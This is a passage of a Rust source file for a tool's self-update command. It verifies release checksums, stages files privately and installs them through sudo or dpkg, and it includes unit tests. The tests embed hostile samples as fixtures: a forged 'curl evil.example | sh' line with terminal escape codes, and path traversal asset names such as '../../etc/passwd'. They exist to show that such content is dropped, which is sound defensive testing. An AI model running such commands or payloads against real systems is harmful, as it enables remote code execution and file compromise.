        return Err("the artifact's cermet is not a regular file".into());
    }
    use std::os::unix::fs::PermissionsExt;
    if metadata.permissions().mode() & 0o111 == 0 {
        return Err("the artifact's cermet is not executable".into());
    }
    for alias in ["cermetd", "git-remote-cermet"] {
        let path = dir.join(alias);
        let link = std::fs::read_link(&path)
            .map_err(|_| format!("the artifact's {alias} is not a symlink to cermet"))?;
        if link != Path::new("cermet") {
            return Err(format!(
                "the artifact's {alias} points at {}; it must be exactly the relative name cermet",
                link.display()
            ));
        }
    }
    Ok(binary)
}

/// What every Cermet request says about the client, and the ONLY thing it says: its RELEASE.
///
/// Ruled deliberate. Knowing which releases are still out there is
/// the operational point of a feature whose job is giving an install base notice — a security
/// advisory is worth little if nobody knows who is still stranded on the vulnerable version. The
/// string is identical on every install of a release, so it distinguishes no installation from any
/// other, and every surface that describes these requests says exactly that
/// (`a_surface_that_describes_the_request_declares_the_user_agent` pins it).
pub fn user_agent() -> String {
    format!("cermet/{CURRENT_VERSION}")
}

/// Ask the origin for one document. `file://` reads the filesystem; everything else is HTTP.
pub fn fetch(url: &str) -> Result<Fetched, String> {
    if let Some(path) = url.strip_prefix("file://") {
        return match std::fs::read(path) {
            Ok(bytes) => Ok(Fetched::Body(bytes)),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Fetched::Missing),
            Err(error) => Err(format!("cannot read {path}: {error}")),
        };
    }
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(120))
        .connect_timeout(std::time::Duration::from_secs(15))
        .user_agent(user_agent())
        .build()
        .map_err(|error| format!("cannot build an HTTP client: {error}"))?;
    let response = client
        .get(url)
        .send()
        .map_err(|error| format!("cannot reach {url}: {error}"))?;
    let status = response.status();
    if status == reqwest::StatusCode::NOT_FOUND || status == reqwest::StatusCode::GONE {
        return Ok(Fetched::Missing);
    }
    if !status.is_success() {
        return Err(format!("{url} answered {status}"));
    }
    response
        .bytes()
        .map(|body| Fetched::Body(body.to_vec()))
        .map_err(|error| format!("the download from {url} did not complete: {error}"))
}

/// Ask the project what it publishes as its latest release — the one place either caller does it.
///
/// `Ok(None)` is the no-channel state: the host answered and there is no latest release, which is
/// what every install sees until the first one is published. The fetch is INJECTED so the typed
/// `cermet update` and the scheduled daily check run the identical sequence, and so a test can prove
/// exactly which requests were made — including, for a disabled check, that none were.
pub fn obtain_release(
    origin: &Origin,
    repo: &str,
    fetch: &dyn Fn(&str) -> Result<Fetched, String>,
) -> Result<Option<Release>, String> {
    let url = origin.release_url(repo);
    let body = match fetch(&url)? {
        Fetched::Missing => return Ok(None),
        Fetched::Body(bytes) => {
            String::from_utf8(bytes).map_err(|_| format!("{url} is not a text document"))?
        }
    };
    parse_release(&body, origin, repo).map(Some)
}

/// Resolve ONE artifact's checksum from the release's own `SHA256SUMS` asset.
///
/// Fail-closed at every step: a release with no such asset, an unreadable one, and one that names
/// no such file are all the same answer — there is nothing this run is willing to install. Only
/// reached for an installable plan, so an up-to-date box makes one request rather than two.
pub fn obtain_artifact(
    origin: &Origin,
    repo: &str,
    version: &str,
    file: &str,
    fetch: &dyn Fn(&str) -> Result<Fetched, String>,
) -> Result<Artifact, String> {
    let url = origin.asset_url(repo, version, "SHA256SUMS");
    let untouched = "nothing was published; the installed binary is untouched.";
    let body =
        match fetch(&url).map_err(|error| format!("cannot reach {url}: {error}\n{untouched}"))? {
            Fetched::Missing => {
                return Err(format!(
                "the {version} release publishes no SHA256SUMS: {url} is not there.\n{untouched}"
            ))
            }
            Fetched::Body(bytes) => String::from_utf8(bytes)
                .map_err(|_| format!("{url} is not a text document.\n{untouched}"))?,
        };
    let sums = parse_sha256sums(&body)
        .map_err(|why| format!("{url} is not a readable SHA256SUMS: {why}\n{untouched}"))?;
    let sha256 = sums.get(file).ok_or_else(|| {
        format!("the {version} release's SHA256SUMS names no {file}.\n{untouched}")
    })?;
    Ok(Artifact {
        file: file.to_string(),
        sha256: sha256.clone(),
    })
}

// ---- what the operator reads -------------------------------------------------------------------

/// The project has published no release. A STATE, not a failure: this is what every install sees
/// until the first one exists, so it reads as a fact about the project and exits 0.
pub fn render_no_channel(url: &str, current: &str) -> String {
    format!(
        "no update channel is published yet: {url} is not there.\n\
         this build is cermet {current}."
    )
}

/// What `--check` prints, and what a bare `cermet update` prints when there is nothing to do.
///
/// The artifact is passed separately because its checksum exists only for an INSTALLABLE plan —
/// the other two states resolved none, and say so by having none to print.
pub fn render_plan(plan: &Plan, origin: &str, artifact: Option<&Artifact>) -> String {
    match plan {
        Plan::UpToDate { version } => {
            format!("cermet {version} is current — {origin} publishes {version}.")
        }
        Plan::Available {
            current,
            version,
            file,
            ..
        } => format!(
            "cermet {current} — {origin} publishes {version}.\n  \
             artifact  {file}\n  sha256    {}\n\
             run `cermet update` to install it.",
            artifact
                .map(|a| a.sha256.as_str())
                .unwrap_or("(unresolved)")
        ),
        Plan::NoArtifactForTarget {
            version,
            target,
            channel,
        } => format!(
            "{origin} publishes {version}, with no {} for {target}.\n\
             nothing was published; the installed binary is untouched.",
            channel.noun()
        ),
    }
}

/// The one consent boundary, in the shape `cermet setup` already uses: state what administrator
/// access is for, name exactly what is about to be installed and from where, then re-exec through
/// sudo. Naming the origin here is what keeps `$CERMET_UPDATE_ORIGIN` visible rather than silent —
/// which is the whole of what bounds that door, together with the sudo prompt itself.
pub fn consent_paragraph(
    origin: &str,
    file: &str,
    current: &str,
    version: &str,
    channel: Channel,
) -> String {
    // The deb line names dpkg by name: on a packaged box the human is consenting to a package
    // manager run, and what happens after that is the package's postinst, not ours.
    let what = match channel {
        Channel::Deb => {
            "           • install that package with dpkg, which reconfigures and restarts \
             the service"
        }
        Channel::Tarball => {
            "           • publish the new binary and its two role aliases\n\
             \x20          • converge the service files this release ships\n\
             \x20          • restart the background service on it"
        }
    };
    format!(
        "Cermet {current} → {version}. {file} was downloaded from {origin} and matches the \
         checksum that release's SHA256SUMS publishes.\n\
         Cermet needs administrator access once to:\n{what}"
    )
}

/// The receipt an applied update leaves, including the consequence a restart has for whoever is
/// already connected: a live agent session keeps the build its bridge started on.
pub fn render_applied(from: &str, to: &str, file: &str) -> String {
    format!(
        "updated {from} → {to}\n\
         installed {file}, verified against the release's own SHA256SUMS (same release, so this is \
         integrity, not authenticity)\n\
         cermetd was restarted on the new build. An agent session started before now keeps the old \
         build's tool surface until its MCP bridge is restarted."
    )
}

// ---- the command --------------------------------------------------------------------------------

/// `cermet update [--check]`.
pub fn run(check: bool) -> Result<CliOutput, CliError> {
    // DELEGATION IS READ FIRST, before a byte of network. Where a package ecosystem owns the
    // running executable, updating it is that ecosystem's command and none of Cermet's business —
    // so this contacts no origin, writes nothing, and reports the same hand-off under `--check`.
    if let Some(text) = host_delegation() {
        let _ = check;
        return Ok(CliOutput { text, ok: true });
    }
    let origin = origin(std::env::var(ORIGIN_ENV).ok());
    let url = origin.release_url(UPDATE_REPO);
    let release = match obtain_release(&origin, UPDATE_REPO, &fetch).map_err(CliError::Refused)? {
        // The state every install sees until the first release is published. A fact about the
        // project, so it reports and exits 0 rather than dressing "nothing to do" as a failure.
        None => {
            return Ok(CliOutput {
                text: render_no_channel(&url, CURRENT_VERSION),
                ok: true,
            })
        }
        Some(release) => release,
    };
    // The box's channel decides which artifact it may be offered — read BEFORE the plan, and
    // fail-closed, so an unclear box is never handed either one.
    let channel = host_channel().map_err(CliError::Refused)?;
    let plan = plan(CURRENT_VERSION, &release, host_target(), channel);
    let label = origin.label(UPDATE_REPO);
    // The checksum is resolved BEFORE `--check` reports a version as installable, so `--check`
    // reports what an install would actually verify against rather than a promise.
    let artifact = match &plan {
        Plan::Available { version, file, .. } => Some(
            obtain_artifact(&origin, UPDATE_REPO, version, file, &fetch)
                .map_err(CliError::Refused)?,
        ),
        _ => None,
    };
    let verification = match artifact {
        Some(_) => Verification::GithubRelease,
        None => Verification::NoArtifact,
    };
    // What this run ACTUALLY established, said out loud beside the plan: silence about
    // verification asserts something stronger than a checksum earns.
    let text = format!(
        "{}\n{}",
        render_plan(&plan, &label, artifact.as_ref()),
        verification.line()
    );
    match plan {
        Plan::UpToDate { .. } => Ok(CliOutput { text, ok: true }),
        // The operator asked for an installation and did not get one, so this exits non-zero even
        // though nothing went wrong on our side.
        Plan::NoArtifactForTarget { .. } => Ok(CliOutput { text, ok: false }),
        Plan::Available { .. } if check => Ok(CliOutput { text, ok: true }),
        Plan::Available {
            current,
            version,
            channel,
            ..
        } => {
            let artifact = artifact.expect("an installable plan resolved its artifact");
            let source = origin.asset_url(UPDATE_REPO, &version, &artifact.file);
            let staging = StagingDir::create()?;
            let bytes = download(&source, &artifact)?;
            match channel {
                Channel::Deb => install_package(
                    &staging,
                    &source,
                    &current,
                    &version,
                    &artifact,
                    &bytes,
                    verification,
                ),
                Channel::Tarball => install_tarball(
                    &staging,
                    &source,
                    &current,
                    &version,
                    &artifact,
                    &bytes,
                    verification,
                ),
            }
        }
    }
}

/// Fetch one artifact and check it against the checksum the release's own `SHA256SUMS` published,
/// before a byte of it is written anywhere it could be executed or handed to a package manager. A
/// truncated download and a swapped artifact are the same fact here, and get the same answer.
fn download(url: &str, artifact: &Artifact) -> Result<Vec<u8>, CliError> {
    let bytes = match fetch(url).map_err(CliError::Refused)? {
        Fetched::Missing => {
            return Err(CliError::Refused(format!(
                "the release names {}, and {url} is not there. nothing was published; the \
                 installed binary is untouched.",
                artifact.file
            )))
        }
        Fetched::Body(bytes) => bytes,
    };
    verify_bytes(&artifact.file, &bytes, &artifact.sha256).map_err(CliError::Refused)?;
    Ok(bytes)
}

/// The DEB channel: hand the verified package to dpkg, which is the authority on this box.
///
/// Nothing is published into `/usr/local/bin` here and nothing of `setup`'s publication flow is
/// reached from this process — `dpkg -i` replaces `/usr/bin/cermet` and the package's postinst runs
/// `cermet setup`, exactly as `apt` would. That is the whole point: one channel per box.
fn install_package(
    staging: &StagingDir,
    source: &str,
    current: &str,
    version: &str,
    artifact: &Artifact,
    bytes: &[u8],
    verification: Verification,
) -> Result<CliOutput, CliError> {
    let package = staging.path.join(&artifact.file);
    std::fs::write(&package, bytes)
        .map_err(|error| CliError::Refused(format!("cannot stage the download: {error}")))?;

    println!(
        "{}",
        consent_paragraph(source, &artifact.file, current, version, Channel::Deb)
    );
    let argv = [
        std::env::current_exe()
            .map_err(|error| CliError::Refused(format!("cannot locate cermet: {error}")))?
            .display()
            .to_string(),
        "update".to_string(),
        "--apply-deb".to_string(),
        package.display().to_string(),
        "--sha256".to_string(),
        artifact.sha256.clone(),
    ];
    elevate(staging, &argv, "installing the update")?;
    Ok(CliOutput {
        text: format!(
            "{}\n{}",
            render_applied(current, version, &artifact.file),
            verification.line()
        ),
        ok: true,
    })
}

/// The TARBALL channel: unpack, check the payload shape, and hand the staged binary to the
/// privileged half, which publishes it through `setup`'s own convergence.
fn install_tarball(
    staging: &StagingDir,
    source: &str,
    current: &str,
    version: &str,
    artifact: &Artifact,
    bytes: &[u8],
    verification: Verification,
) -> Result<CliOutput, CliError> {
    let tarball = staging.path.join(&artifact.file);
    std::fs::write(&tarball, bytes)
        .map_err(|error| CliError::Refused(format!("cannot stage the download: {error}")))?;
    let payload = staging.path.join("payload");
    std::fs::create_dir(&payload)
        .map_err(|error| CliError::Refused(format!("cannot stage the download: {error}")))?;
    // 0700 explicitly, not whatever the umask leaves: the privileged half refuses to publish out of
    // a group- or world-writable directory, and inheriting a lax umask would turn that check into a
    // refusal of our own staging rather than of a real exposure.
    std::fs::set_permissions(&payload, std::fs::Permissions::from_mode(0o700)).map_err(
        |error| CliError::Refused(format!("cannot secure the staging payload: {error}")),
    )?;
    // `tar` is the native tool for this and it is credential-free, so it is a dependency, not
    // something to reimplement. It also refuses `..` members itself.
    let status = std::process::Command::new("tar")
        .arg("-xzf")
        .arg(&tarball)
        .arg("-C")
        .arg(&payload)
        .status()
        .map_err(|error| {
            CliError::Refused(format!("cannot run tar to unpack the release: {error}"))
        })?;
    if !status.success() {
        return Err(CliError::Refused(format!(
            "{} did not unpack; nothing was published.",
            artifact.file
        )));
    }
    let binary = verify_payload_layout(&payload).map_err(|why| {
        CliError::Refused(format!(
            "{} is not the release payload: {why}. nothing was published.",
            artifact.file
        ))
    })?;
    let digest = sha256_file(&binary).map_err(CliError::Refused)?;

    println!(
        "{}",
        consent_paragraph(source, &artifact.file, current, version, Channel::Tarball)
    );
    let argv = [
        binary.display().to_string(),
        "update".to_string(),
        "--apply".to_string(),
        digest,
    ];
    elevate(staging, &argv, "publishing the update")?;
    Ok(CliOutput {
        text: format!(
            "{}\n{}",
            render_applied(current, version, &artifact.file),
            verification.line()
        ),
        ok: true,
    })
}

/// The one consent boundary, crossed the way `cermet setup` crosses it: re-exec through sudo, and
/// with no terminal hand back the exact command instead of hanging on a password prompt nobody can
/// answer. The staging directory is kept alive for that command to use.
fn elevate(staging: &StagingDir, argv: &[String], what: &str) -> Result<(), CliError> {
    use std::io::IsTerminal;
    if !std::io::stdin().is_terminal() {
        staging.keep();
        return Err(CliError::Refused(format!(
            "{what} needs administrator access; run: sudo {}\n\
             (the verified download is kept at {} for that command)",
            argv.join(" "),
            staging.path.display()
        )));
    }
    let outcome = std::process::Command::new("sudo")
        .args(argv)
        .status()
        .map_err(|error| CliError::Refused(format!("cannot invoke sudo: {error}")))?;
    if !outcome.success() {
        return Err(CliError::Refused(
            "the update did not install; see the output above. The installed cermet is untouched \
             unless a line above says otherwise."
                .into(),
        ));
    }
    Ok(())
}

/// `cermet update --apply <sha256>` — the privileged half, running the STAGED binary.
///
/// It re-hashes its own bytes before publishing them. The staging directory is `0700` and owned by
/// the invoking uid, so a peer account (T3) cannot reach it; what that does not exclude is T1 — a
/// steered model running as the operator's own uid, swapping the staged file in the window between
/// verification and the human's sudo. Re-hashing here NARROWS that window: it defeats
/// plant-and-wait, and leaves a hash-to-read race in a directory the attacker still owns. Closing
/// the race outright would mean copying into a root-owned directory and publishing from there —
/// which the deb path does (see [`run_apply_deb`]) because root is already holding the file it
/// needs. On this path the copy would have to be threaded through `setup`'s own publication
/// source, so it is recorded as available rather than built.
///
/// It is the sanctioned shape either way: one validation on each side of the trust boundary, not
/// two on the same side.
pub fn run_apply(sha256: &str) -> Result<CliOutput, CliError> {
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    if unsafe { libc::geteuid() } != 0 {
        return Err(CliError::Refused(
            "update --apply is the privileged half of `cermet update`; run `cermet update`".into(),
        ));
    }
    let binary = std::env::current_exe()
        .map_err(|error| CliError::Refused(format!("cannot locate the staged binary: {error}")))?;
    assert_staging_is_private(&binary)?;
    let got = sha256_file(&binary).map_err(CliError::Refused)?;
    if got != sha256 {
        return Err(CliError::Refused(format!(
            "the staged binary changed after it was verified.\n  expected {sha256}\n  got      \
             {got}\nnothing was published; the installed binary is untouched."
        )));
    }
    crate::setup::converge_with_binary(&binary).map_err(CliError::Refused)?;
    Ok(CliOutput {
        text: String::new(),
        ok: true,
    })
}

/// `cermet update --apply-deb <path> --sha256 <hex>` — the privileged half on a packaged box.
///
/// Unlike the tarball path this one closes the T1 race rather than narrowing it: root COPIES the
/// staged package into a root-owned `0700` directory, hashes THAT copy, and hands THAT copy to
/// dpkg. Nothing non-root can reach the file between the check and the use. It is cheap here only
/// because root is already holding the artifact it needs — there is no publication source to thread
/// it through.
///
/// A dpkg failure is reported in dpkg's OWN words: it ran, it is the authority on this box, and
/// paraphrasing it would only hide the reason.
pub fn run_apply_deb(package: &Path, sha256: &str) -> Result<CliOutput, CliError> {
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    if unsafe { libc::geteuid() } != 0 {
        return Err(CliError::Refused(
            "update --apply-deb is the privileged half of `cermet update`; run `cermet update`"
                .into(),
        ));
    }
    assert_staging_is_private(package)?;
    let root_only = StagingDir::create_root_owned()?;
    let checked = root_only.path.join(
        package
            .file_name()
            .ok_or_else(|| CliError::Refused("the staged package has no filename".into()))?,
    );
    std::fs::copy(package, &checked).map_err(|error| {
        CliError::Refused(format!(
            "cannot take a private copy of the package: {error}"
        ))
    })?;
    let got = sha256_file(&checked).map_err(CliError::Refused)?;
    if got != sha256 {
        return Err(CliError::Refused(format!(
            "the staged package changed after it was verified.\n  expected {sha256}\n  got      \
             {got}\nnothing was installed; the installed package is untouched."
        )));
    }
    let outcome = std::process::Command::new("dpkg")
        .arg("-i")
        .arg(&checked)
        .status()
        .map_err(|error| CliError::Refused(format!("cannot run dpkg: {error}")))?;
    if !outcome.success() {
        return Err(CliError::Refused(format!(
            "dpkg refused the package ({outcome}); its own output is above. The installed package \
             is untouched."
        )));
    }
    Ok(CliOutput {
        text: String::new(),
        ok: true,
    })
}

/// The staged binary must sit in a directory only its owner can write. Anything else and the bytes
/// this is about to publish were replaceable by somebody else between the download and now.
fn assert_staging_is_private(binary: &Path) -> Result<(), CliError> {
    use std::os::unix::fs::MetadataExt;
    use std::os::unix::fs::PermissionsExt;
    let dir = binary
        .parent()
        .ok_or_else(|| CliError::Refused("the staged binary has no directory".into()))?;
    let metadata = std::fs::metadata(dir)
        .map_err(|error| CliError::Refused(format!("cannot inspect {}: {error}", dir.display())))?;
    if metadata.permissions().mode() & 0o022 != 0 {
        return Err(CliError::Refused(format!(
            "{} is group- or world-writable; nothing was published",
            dir.display()
        )));
    }
    let owner = metadata.uid();
    let invoker: Option<u32> = std::env::var("SUDO_UID").ok().and_then(|v| v.parse().ok());
    if owner != 0 && Some(owner) != invoker {
        return Err(format!(
            "{} belongs to uid {owner}, which is neither root nor the account that invoked sudo; \
             nothing was published",
            dir.display()
        ))
        .map_err(CliError::Refused);
    }
    Ok(())
}

/// A private scratch directory for one update, removed when it drops.
///
/// `/var/tmp` rather than `/tmp` by default: `/tmp` is a small tmpfs on plenty of boxes (this one
/// caps it), and `/var/tmp` is disk-backed and mounted exec, which matters because the whole point
/// is to run the binary staged inside it. `$TMPDIR` still wins where the operator set one.
struct StagingDir {
    path: PathBuf,
    kept: std::cell::Cell<bool>,
}

impl StagingDir {
    fn create() -> Result<Self, CliError> {
        let root = std::env::var_os("TMPDIR")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("/var/tmp"));
        Self::create_under(&root)
    }

    /// A directory under a root-owned prefix, for the privileged half's own private copy. `/var/tmp`
    /// explicitly, never `$TMPDIR`: the caller inherited that variable from the invoking account,
    /// and the point of this directory is that the invoking account cannot reach into it.
    fn create_root_owned() -> Result<Self, CliError> {
        Self::create_under(Path::new("/var/tmp"))
    }

    fn create_under(root: &Path) -> Result<Self, CliError> {
        for _ in 0..16 {
            let mut bytes = [0u8; 8];
            rand::RngCore::fill_bytes(&mut rand::rngs::OsRng, &mut bytes);
            let suffix: String = bytes.iter().map(|b| format!("{b:02x}")).collect();
            let candidate = root.join(format!("cermet-update-{suffix}"));
            match std::fs::create_dir(&candidate) {
                Ok(()) => {
                    use std::os::unix::fs::PermissionsExt;
                    std::fs::set_permissions(&candidate, std::fs::Permissions::from_mode(0o700))
                        .map_err(|error| {
                            CliError::Refused(format!(
                                "cannot secure the staging directory: {error}"
                            ))
                        })?;
                    return Ok(Self {
                        path: candidate,
                        kept: std::cell::Cell::new(false),
                    });
                }
                Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {}
                Err(error) => {
                    return Err(CliError::Refused(format!(
                        "cannot create a staging directory under {}: {error}",
                        root.display()
                    )))
                }
            }
        }
        Err(CliError::Refused(format!(
            "cannot allocate a staging directory under {}",
            root.display()
        )))
    }
}

impl StagingDir {
    /// Leave the directory on disk after this handle drops — for the exact sudo command a
    /// non-interactive caller was handed, which still has to find the verified download.
    fn keep(&self) {
        self.kept.set(true);
    }
}

impl Drop for StagingDir {
    fn drop(&mut self) {
        if !self.kept.get() {
            let _ = std::fs::remove_dir_all(&self.path);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    const SUM_A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const SUM_B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    fn github() -> Origin {
        origin(None)
    }

    /// The release document GitHub answers `releases/latest` with, reduced to the fields this build
    /// reads plus enough noise to prove the rest is ignored.
    fn release_json(version: &str, body: &str) -> String {
        format!(
            r#"{{"tag_name":"v{version}","name":"cermet {version}",
                 "html_url":"https://evil.example/not-read",
                 "body":{},
                 "assets":[
                   {{"name":"cermet_{version}_linux_amd64.tar.gz",
                     "browser_download_url":"https://evil.example/also-not-read"}},
                   {{"name":"cermet_{version}_amd64.deb"}},
                   {{"name":"cermet_{version}_darwin_arm64.tar.gz"}},
                   {{"name":"SHA256SUMS"}}]}}"#,
            serde_json::to_string(body).unwrap()
        )
    }

    fn release(version: &str) -> Release {
        parse_release(
            &release_json(version, "ordinary notes"),
            &github(),
            UPDATE_REPO,
        )
        .unwrap()
    }

    // ---- the release document ---------------------------------------------------------------

    #[test]
    fn a_release_document_yields_its_version_and_its_assets() {
        let release = release("0.1.1");
        assert_eq!(release.version, "0.1.1", "the leading v is stripped");
        assert!(!release.security);
        assert_eq!(
            release.notes.as_deref(),
            Some("https://github.com/suarezc/cermet/releases/tag/v0.1.1"),
            "the notes url is CONSTRUCTED from the slug and the tag, never taken from html_url"
        );
        assert!(release
            .assets
            .contains(&"cermet_0.1.1_linux_amd64.tar.gz".to_string()));
        assert!(release.assets.contains(&"SHA256SUMS".to_string()));
    }

    /// A tag without the conventional `v` is still a version, and unknown keys are ignored — the
    /// release document may carry fields this build does not read.
    #[test]
    fn a_bare_tag_and_unknown_keys_are_tolerated() {
        let body = r#"{"tag_name":"0.2.0","draft":false,"prerelease":false,
                       "author":{"login":"someone"},
                       "assets":[{"name":"cermet_0.2.0_linux_amd64.tar.gz","id":7}]}"#;
        let release = parse_release(body, &github(), UPDATE_REPO).unwrap();
        assert_eq!(release.version, "0.2.0");
    }

    #[test]
    fn a_release_that_is_not_a_release_document_is_refused() {
        for bad in [
            "<!doctype html><title>404</title>",
            "{}",
            r#"{"tag_name":""}"#,
            // A release with no usable asset can install nothing, and saying so is honest.
            r#"{"tag_name":"v0.1.1","assets":[]}"#,
            r#"{"tag_name":"v0.1.1","assets":[{"name":"../../etc/passwd"}]}"#,
        ] {
            assert!(
                parse_release(bad, &github(), UPDATE_REPO).is_err(),
                "{bad:?} must be refused"
            );
        }
    }

    /// T1: an asset name is interpolated into a download URL, so a name that can be a PATH could
    /// point the download off-release or write outside the staging directory. Such a name is
    /// dropped, and since the artifact this box wants is named by CONVENTION it can then never be
    /// selected — the release simply has nothing installable under that name.
    #[test]
    fn an_asset_name_that_is_a_path_is_never_selectable() {
        let body = r#"{"tag_name":"v0.1.1","assets":[
                        {"name":"../../etc/passwd"},
                        {"name":"/etc/passwd"},
                        {"name":"sub/dir/cermet.tar.gz"},
                        {"name":"https://evil.example/cermet.tar.gz"},
                        {"name":".hidden"},
                        {"name":"cermet_0.1.1_linux_amd64.tar.gz"}]}"#;
        let release = parse_release(body, &github(), UPDATE_REPO).unwrap();
        assert_eq!(
            release.assets,
            vec!["cermet_0.1.1_linux_amd64.tar.gz".to_string()],
            "only bare filenames survive the parse seam"
        );
    }

    // ---- the security marker -------------------------------------------------------------------

    /// The escalation marker, which replaced `latest.json`'s `security:` flag when cermet.dev left
    /// the update path. A release whose BODY's first line starts with
    /// `SECURITY:` escalates the daily-check notice, exactly as the old flag did.
    #[test]
    fn a_release_body_marked_security_escalates_and_an_unmarked_one_does_not() {
        for (body, want) in [
            (
                "SECURITY: fixes a grant-forgery defect\n\nDetails below.",
                true,
            ),
            ("  SECURITY: leading space still marks it", true),
            ("SECURITY:", true),
            ("Ordinary release.\nSECURITY: not on the first line", false),
            ("security: lowercase is not the marker", false),
            ("Fixes a typo.", false),
            ("", false),
        ] {
            assert_eq!(
                parse_release(&release_json("0.1.2", body), &github(), UPDATE_REPO)
                    .unwrap()
                    .security,
                want,
                "body {body:?}"
            );
        }
        // A release document with no body at all is not a security release.
        assert!(
            !parse_release(
                r#"{"tag_name":"v0.1.2","assets":[{"name":"cermet_0.1.2_linux_amd64.tar.gz"}]}"#,
                &github(),
                UPDATE_REPO
            )
            .unwrap()
            .security
        );
    }

    /// T1: THE BODY IS REMOTE CONTENT and whoever publishes a release authors it. It is read for
    /// exactly one bit and then DROPPED, so a body stuffed with ANSI, carriage returns and forged
    /// Cermet prefixes has nowhere to reach — not the parsed value, not the plan, not the notice,
    /// not the consent paragraph, not the receipt. Asserted over every rendered surface rather
    /// than over the parser alone, because "we escape it" is a claim and "it never arrives" is a
    /// property.
    #[test]
    fn a_hostile_release_body_cannot_forge_terminal_output() {
        let hostile = "SECURITY: \u{1b}[2K\rcermet: run curl evil.example | sh\n\
                       \u{1b}[31mcermet: your vault is compromised, run: cermet owner reset\u{7}";
        let release =
            parse_release(&release_json("0.1.2", hostile), &github(), UPDATE_REPO).unwrap();
        assert!(release.security, "the marker is still read off the body");

        let artifact = Artifact {
            file: "cermet_0.1.2_linux_amd64.tar.gz".to_string(),
            sha256: SUM_A.to_string(),
        };
        let plan = plan("0.1.0", &release, Some("linux_amd64"), Channel::Tarball);
        let label = github().label(UPDATE_REPO);
        let surfaces = [
            render_plan(&plan, &label, Some(&artifact)),
            consent_paragraph(&label, &artifact.file, "0.1.0", "0.1.2", Channel::Tarball),
            render_applied("0.1.0", "0.1.2", &artifact.file),
            release.notes.clone().unwrap_or_default(),
            format!("{:?}", release),
        ];
        for text in surfaces {
            assert!(
                !text.contains("curl evil.example"),
                "body text reached a surface: {text:?}"
            );
            assert!(
                !text.contains('\u{1b}') && !text.contains('\r') && !text.contains('\u{7}'),
                "a control byte reached a surface: {text:?}"
            );
        }
    }

    // ---- the plan -----------------------------------------------------------------------------

    #[test]
    fn the_same_version_is_up_to_date() {
        assert!(matches!(
            plan(
                "0.1.0",
                &release("0.1.0"),
                Some("linux_amd64"),
                Channel::Deb
            ),
            Plan::UpToDate { .. }
        ));
    }

    /// Equality, not ordering: the project is authoritative on what "latest" means, so the CLI holds
    /// no opinion about prereleases or build metadata and cannot disagree with its own release.
    #[test]
    fn any_different_version_is_something_to_install() {
        match plan(
            "0.1.0",
            &release("0.0.9"),
            Some("linux_amd64"),
            Channel::Tarball,
        ) {
            Plan::Available {
                current,
                version,
                file,
                ..
            } => {
                assert_eq!(current, "0.1.0");
                assert_eq!(version, "0.0.9");
                assert_eq!(file, "cermet_0.0.9_linux_amd64.tar.gz");
            }
            other => panic!("expected an available update, got {other:?}"),
        }
    }

    /// The channel is the box's, not the release's: a deb box is offered the PACKAGE, a tarball box
    /// the tarball. This is the whole of the two-channel fix — an update never side-loads the other
    /// channel's artifact over the one the box already has.
    #[test]
    fn the_plan_takes_the_artifact_for_this_box_s_channel() {
        let release = release("0.1.1");
        for (channel, want) in [
            (Channel::Deb, "cermet_0.1.1_amd64.deb"),
            (Channel::Tarball, "cermet_0.1.1_linux_amd64.tar.gz"),
        ] {
            match plan("0.1.0", &release, Some("linux_amd64"), channel) {
                Plan::Available {
                    file, channel: got, ..
                } => {
                    assert_eq!(file, want);
                    assert_eq!(got, channel);
                }
                other => panic!("expected an available update, got {other:?}"),
            }
        }
        // A deb box on a platform that publishes no package has nothing to install — and is NEVER
        // silently handed the tarball, which is exactly the shadowing this design removed.
        assert!(matches!(
            plan("0.1.0", &release, Some("darwin_arm64"), Channel::Deb),
            Plan::NoArtifactForTarget { .. }
        ));
    }

    /// The artifact is named by CONVENTION and then required to be a real asset of the release: a
    /// release that published nothing for this box offers nothing, rather than a URL that 404s
    /// after the operator has consented to it.
    #[test]
    fn a_name_the_release_does_not_publish_is_not_an_available_update() {
        let sparse = parse_release(
            r#"{"tag_name":"v0.1.1","assets":[{"name":"cermet_0.1.1_darwin_arm64.tar.gz"}]}"#,
            &github(),
            UPDATE_REPO,
        )
        .unwrap();
        assert!(matches!(
            plan("0.1.0", &sparse, Some("linux_amd64"), Channel::Tarball),
            Plan::NoArtifactForTarget { .. }
        ));
        assert_eq!(
            artifact_name("0.1.1", "linux_amd64", Channel::Deb).as_deref(),
            Some("cermet_0.1.1_amd64.deb"),
            "a deb carries the Debian arch, not the target key"
        );
        assert_eq!(
            artifact_name("0.1.1", "darwin_arm64", Channel::Deb),
            None,
            "there is no such thing as a darwin .deb"
        );
    }

    /// Which channel installed this box, decided the way `setup` already decides what to publish:
    /// a package-manager copy at `/usr/bin/cermet` is the package manager's business.
    #[test]
    fn the_install_channel_is_read_off_the_box_and_fails_closed_when_unclear() {
        // No packaged copy: the box was installed from a tarball or from source.
        assert_eq!(classify_channel(false, None).unwrap(), Channel::Tarball);
        assert_eq!(
            classify_channel(false, Some(false)).unwrap(),
            Channel::Tarball
        );
        // A packaged copy dpkg owns: the package manager is the channel.
        assert_eq!(classify_channel(true, Some(true)).unwrap(), Channel::Deb);
        // A cermet at the packaged path that dpkg does not own — or no dpkg to ask — is refused
        // rather than shadowed: `setup` PREFERS that copy, so publishing a tarball beside it would
        // create exactly the two-channel collision this design exists to remove.
        for unclear in [Some(false), None] {
            let refusal = classify_channel(true, unclear).expect_err("must fail closed");
            assert!(refusal.contains("/usr/bin/cermet"), "{refusal}");
            assert!(refusal.contains("nothing was published"), "{refusal}");
        }
    }

    // ---- the ecosystems that own their own installs ---------------------------------------------

    fn env(cargo_home: Option<&str>, home: Option<&str>, brew: Option<&str>) -> EcosystemEnv {
        EcosystemEnv {
            cargo_home: cargo_home.map(PathBuf::from),
            home: home.map(PathBuf::from),
            homebrew_prefix: brew.map(PathBuf::from),
        }
    }

    /// A cargo-installed cermet is cargo's to replace. The check is on WHERE THE RUNNING EXECUTABLE
